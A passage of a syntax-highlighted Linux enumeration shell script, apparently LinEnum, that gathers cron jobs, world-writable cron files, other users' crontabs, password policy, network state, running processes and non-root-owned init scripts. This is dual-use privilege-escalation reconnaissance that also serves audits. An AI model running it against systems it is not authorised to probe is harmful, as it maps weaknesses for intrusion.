string">"\e[00;31m[-] Current umask value:\e[00m\n<span class="token variable">$umaskvalue</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#umask value as in /etc/login.defs</span>umaskdef<span class="token operator">=</span>`grep -i <span class="token string">"^UMASK"</span> /etc/login.defs 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$umaskdef</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] umask value as specified in /etc/login.defs:\e[00m\n<span class="token variable">$umaskdef</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#password policy information as stored in /etc/login.defs</span>logindefs<span class="token operator">=</span>`grep <span class="token string">"^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD"</span> /etc/login.defs 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$logindefs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Password and storage information:\e[00m\n<span class="token variable">$logindefs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$logindefs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/login.defs <span class="token variable">$format</span>/etc-export/login.defs 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token punctuation">}</span>job_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### JOBS/TASKS ##########################################\e[00m"</span> <span class="token comment" spellcheck="true">#are there any cron jobs configured</span>cronjobs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/cron* 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$cronjobs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Cron jobs:\e[00m\n<span class="token variable">$cronjobs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#can we manipulate these jobs in any way</span>cronjobwwperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc/cron* -perm -0002 -type f -exec <span class="token function">ls</span> -la <span class="token punctuation">{</span><span class="token punctuation">}</span> \<span class="token punctuation">;</span> -exec <span class="token function">cat</span> <span class="token punctuation">{</span><span class="token punctuation">}</span> 2<span class="token operator">></span>/dev/null \<span class="token punctuation">;</span><span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$cronjobwwperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m[+] World-writable cron jobs and file contents:\e[00m\n<span class="token variable">$cronjobwwperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#contab contents</span>crontabvalue<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/crontab 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$crontabvalue</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Crontab contents:\e[00m\n<span class="token variable">$crontabvalue</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>crontabvar<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /var/spool/cron/crontabs 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$crontabvar</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Anything interesting in /var/spool/cron/crontabs:\e[00m\n<span class="token variable">$crontabvar</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>anacronjobs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/anacrontab 2<span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token function">cat</span> /etc/anacrontab 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$anacronjobs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Anacron jobs and associated file permissions:\e[00m\n<span class="token variable">$anacronjobs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>anacrontab<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /var/spool/anacron 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$anacrontab</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] When were jobs last executed (/var/spool/anacron contents):\e[00m\n<span class="token variable">$anacrontab</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#pull out account names from /etc/passwd and see if any users have associated cronjobs (priv command)</span>cronother<span class="token operator">=</span>`cut -d <span class="token string">":"</span> -f 1 /etc/passwd <span class="token operator">|</span> <span class="token function">xargs</span> -n1 <span class="token function">crontab</span> -l -u 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$cronother</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Jobs held by all users:\e[00m\n<span class="token variable">$cronother</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># list systemd timers</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$thorough</span>"</span> <span class="token operator">=</span> <span class="token string">"1"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token comment" spellcheck="true"># include inactive timers in thorough mode</span>  systemdtimers<span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>systemctl list-timers --all 2<span class="token operator">></span>/dev/null<span class="token variable">)</span></span>"</span>  info<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">else</span>  systemdtimers<span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>systemctl list-timers 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">head</span> -n -1 2<span class="token operator">></span>/dev/null<span class="token variable">)</span></span>"</span>  <span class="token comment" spellcheck="true"># replace the info in the output with a hint towards thorough mode</span>  info<span class="token operator">=</span><span class="token string">"\e[2mEnable thorough tests to see inactive timers\e[00m"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$systemdtimers</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Systemd timers:\e[00m\n<span class="token variable">$systemdtimers</span>\n<span class="token variable">$info</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>networking_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### NETWORKING  ##########################################\e[00m"</span> <span class="token comment" spellcheck="true">#nic information</span>nicinfo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>/sbin/ifconfig -a 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nicinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Network and IP info:\e[00m\n<span class="token variable">$nicinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#nic information (using ip)</span>nicinfoip<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>/sbin/ip a 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$nicinfo</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nicinfoip</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Network and IP info:\e[00m\n<span class="token variable">$nicinfoip</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>arpinfo<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>arp -a 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$arpinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] ARP history:\e[00m\n<span class="token variable">$arpinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>arpinfoip<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>ip n 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$arpinfo</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$arpinfoip</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] ARP history:\e[00m\n<span class="token variable">$arpinfoip</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#dns settings</span>nsinfo<span class="token operator">=</span>`grep <span class="token string">"nameserver"</span> /etc/resolv.conf 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nsinfo</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Nameserver(s):\e[00m\n<span class="token variable">$nsinfo</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>nsinfosysd<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>systemd-resolve --status 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$nsinfosysd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Nameserver(s):\e[00m\n<span class="token variable">$nsinfosysd</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#default route configuration</span>defroute<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>route 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> default<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$defroute</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Default route:\e[00m\n<span class="token variable">$defroute</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#default route configuration</span>defrouteip<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>ip r 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">grep</span> default<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$defroute</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$defrouteip</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Default route:\e[00m\n<span class="token variable">$defrouteip</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#listening TCP</span>tcpservs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">netstat</span> -ntpl 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$tcpservs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Listening TCP:\e[00m\n<span class="token variable">$tcpservs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>tcpservsip<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>ss -t -l -n 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$tcpservs</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$tcpservsip</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Listening TCP:\e[00m\n<span class="token variable">$tcpservsip</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#listening UDP</span>udpservs<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">netstat</span> -nupl 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$udpservs</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Listening UDP:\e[00m\n<span class="token variable">$udpservs</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>udpservsip<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span>ss -u -l -n 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token string">"<span class="token variable">$udpservs</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$udpservsip</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Listening UDP:\e[00m\n<span class="token variable">$udpservsip</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token punctuation">}</span>services_info<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> -e <span class="token string">"\e[00;33m### SERVICES #############################################\e[00m"</span> <span class="token comment" spellcheck="true">#running processes</span>psaux<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ps</span> aux 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$psaux</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Running processes:\e[00m\n<span class="token variable">$psaux</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#lookup process binary path and permissisons</span>procperm<span class="token operator">=</span>`ps aux 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$11</span>}'</span><span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">awk</span> <span class="token string">'!x[<span class="token variable">$0</span>]++'</span> 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$procperm</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Process binaries and associated permissions (from above list):\e[00m\n<span class="token variable">$procperm</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$procperm</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>procpermbase<span class="token operator">=</span>`ps aux 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$11</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> -r <span class="token function">ls</span> 2<span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'!x[<span class="token variable">$0</span>]++'</span> 2<span class="token operator">></span>/dev/null`  <span class="token function">mkdir</span> <span class="token variable">$format</span>/ps-export/ 2<span class="token operator">></span>/dev/null  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token variable">$procpermbase</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token function">cp</span> --parents <span class="token variable">$i</span> <span class="token variable">$format</span>/ps-export/<span class="token punctuation">;</span> <span class="token keyword">done</span> 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#anything 'useful' in inetd.conf</span>inetdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/inetd.conf 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$inetdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Contents of /etc/inetd.conf:\e[00m\n<span class="token variable">$inetdread</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$inetdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/inetd.conf <span class="token variable">$format</span>/etc-export/inetd.conf 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span><span class="token comment" spellcheck="true">#very 'rough' command to extract associated binaries from inetd.conf &amp; show permisisons of each</span>inetdbinperms<span class="token operator">=</span>`awk <span class="token string">'{print <span class="token variable">$7</span>}'</span> /etc/inetd.conf 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$inetdbinperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] The related inetd binary permissions:\e[00m\n<span class="token variable">$inetdbinperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>xinetdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">cat</span> /etc/xinetd.conf 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$xinetdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] Contents of /etc/xinetd.conf:\e[00m\n<span class="token variable">$xinetdread</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$export</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$xinetdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token function">mkdir</span> <span class="token variable">$format</span>/etc-export/ 2<span class="token operator">></span>/dev/null  <span class="token function">cp</span> /etc/xinetd.conf <span class="token variable">$format</span>/etc-export/xinetd.conf 2<span class="token operator">></span>/dev/null<span class="token keyword">fi</span>xinetdincd<span class="token operator">=</span>`grep <span class="token string">"/etc/xinetd.d"</span> /etc/xinetd.conf 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$xinetdincd</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/xinetd.d is included in /etc/xinetd.conf - associated binary permissions are listed below:\e[00m"</span><span class="token punctuation">;</span> <span class="token function">ls</span> -la /etc/xinetd.d 2<span class="token operator">></span>/dev/null   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#very 'rough' command to extract associated binaries from xinetd.conf &amp; show permisisons of each</span>xinetdbinperms<span class="token operator">=</span>`awk <span class="token string">'{print <span class="token variable">$7</span>}'</span> /etc/xinetd.conf 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null`<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$xinetdbinperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] The related xinetd binary permissions:\e[00m\n<span class="token variable">$xinetdbinperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>initdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/init.d 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$initdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n<span class="token variable">$initdread</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#init.d files NOT belonging to root!</span>initdperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc/init.d/ \<span class="token operator">!</span> -uid 0 -type f 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$initdperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/init.d/ files not belonging to root:\e[00m\n<span class="token variable">$initdperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>rcdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/rc.d/init.d 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rcdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/rc.d/init.d binary permissions:\e[00m\n<span class="token variable">$rcdread</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#init.d files NOT belonging to root!</span>rcdperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /etc/rc.d/init.d \<span class="token operator">!</span> -uid 0 -type f 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$rcdperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/rc.d/init.d files not belonging to root:\e[00m\n<span class="token variable">$rcdperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>usrrcdread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /usr/local/etc/rc.d 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrrcdread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /usr/local/etc/rc.d binary permissions:\e[00m\n<span class="token variable">$usrrcdread</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true">#rc.d files NOT belonging to root!</span>usrrcdperms<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">find</span> /usr/local/etc/rc.d \<span class="token operator">!</span> -uid 0 -type f 2<span class="token operator">></span>/dev/null <span class="token operator">|</span><span class="token function">xargs</span> -r <span class="token function">ls</span> -la 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$usrrcdperms</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /usr/local/etc/rc.d files not belonging to root:\e[00m\n<span class="token variable">$usrrcdperms</span>"</span>   <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span>initread<span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ls</span> -la /etc/init/ 2<span class="token operator">></span>/dev/null<span class="token variable">`</span></span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$initread</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token keyword">echo</span> -e <span class="token string">"\e[00;31m[-] /etc/init/ config file permissions:\e[00m\n<span class="token variable">$initread</span>"</span>  <span class="token keyword">echo</span> -e <span class="token string">"\n"</span><span class="token keyword">fi</span><span class="token comment" 